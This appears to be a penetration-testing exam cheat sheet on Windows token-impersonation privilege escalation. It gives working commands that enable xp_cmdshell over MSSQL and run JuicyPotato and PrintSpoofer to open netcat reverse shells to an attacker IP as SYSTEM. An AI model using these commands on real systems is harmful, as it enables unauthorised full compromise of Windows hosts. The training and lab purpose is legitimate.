# **SeImpersonate and SeAssignPrimaryToken**

## **1. Overview**

- Every Windows process has an **Access Token** containing information about the account running the process.
- `SeImpersonatePrivilege` allows a process to impersonate another user's security context.
- These privileges are commonly abused for **Privilege Escalation (Potato Attacks)**.
- Common scenario: Gaining RCE through a service account (IIS, MSSQL, Jenkins, etc.) and escalating to `NT AUTHORITY\SYSTEM`.

### **Important Privileges**

| Privilege                       | Description                               |
| ------------------------------- | ----------------------------------------- |
| `SeImpersonatePrivilege`        | Impersonate a client after authentication |
| `SeAssignPrimaryTokenPrivilege` | Replace a process-level token             |

**Exam tip:** Always check privileges immediately after gaining a Windows foothold through a service account.

```
whoami /priv
```

## **2. Potato Attacks (Concept)**

- Attackers abuse impersonation privileges to obtain a privileged SYSTEM token.
- The attack tricks a SYSTEM-level process into connecting to an attacker-controlled process.
- The attacker impersonates the SYSTEM token and launches a process with elevated privileges.

Common tools:

| Tool         | Supported Scenario                                   |
| ------------ | ---------------------------------------------------- |
| JuicyPotato  | Older Windows versions                               |
| PrintSpoofer | Windows 10 / Server 2019 and newer applicable builds |
| RoguePotato  | Alternative Potato technique                         |

## **3. MSSQL – Checking SeImpersonatePrivilege**

Connect to MSSQL using Impacket:

```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Enable `xp_cmdshell`:

```
enable_xp_cmdshell
```

Execute Windows commands:

```
xp_cmdshell whoami
```

Check privileges:

```
xp_cmdshell whoami /priv
```

**Look for:**

```
SeImpersonatePrivilege        Enabled
SeAssignPrimaryTokenPrivilege Disabled
```

Important finding

If `SeImpersonatePrivilege` is enabled, investigate Potato-style privilege escalation.

## **4. JuicyPotato**

Older Windows versions

- Exploits `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
- Uses DCOM/NTLM reflection abuse.
- Can execute commands as `NT AUTHORITY\SYSTEM`.

**Note:** JuicyPotato does not work on Windows Server 2019 and Windows 10 build 1809 onwards.

### **Basic Usage**

Start Netcat listener on attacker machine:

```
nc -lnvp 8443
```

Execute through MSSQL:

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

**Important arguments:**

| Argument | Description                       |
| -------- | --------------------------------- |
| `-l`     | COM server listening port         |
| `-p`     | Program to execute                |
| `-a`     | Arguments passed to the program   |
| `-t *`   | Try both process creation methods |

Successful exploitation may return:

```
[+] CreateProcessWithTokenW OK
```

Verify SYSTEM access:

```
whoami
```

Expected:

```
nt authority\system
```

## **5. PrintSpoofer**

Alternative to JuicyPotato

- Useful on Windows 10 and Windows Server 2019 where JuicyPotato no longer works.
- Abuses `SeImpersonatePrivilege`.
- Can spawn a SYSTEM process or establish a reverse shell.

Start listener:

```
nc -lnvp 8443
```

Execute:

```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

Successful output:

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Verify:

```
whoami
```

Expected:

```
nt authority\system
```

## **6. Quick Exam Reference**

| Situation                               | Action                               |
| --------------------------------------- | ------------------------------------ |
| Initial Windows foothold                | Run `whoami /priv`                   |
| `SeImpersonatePrivilege` enabled        | Investigate Potato attacks           |
| `SeAssignPrimaryTokenPrivilege` enabled | Investigate token-based escalation   |
| Older Windows versions                  | Try JuicyPotato                      |
| Windows 10 build 1809+ / Server 2019    | Consider PrintSpoofer or RoguePotato |
| Successful escalation                   | Verify using `whoami`                |

### **Practical Enumeration Checklist**

```
whoami
whoami /priv
whoami /groups
```

**Remember:**

1. Always enumerate privileges after obtaining service-account access.
2. `SeImpersonatePrivilege` is a major privilege escalation opportunity.
3. Select the exploitation technique based on the target Windows version.
4. Confirm successful escalation with `whoami`.
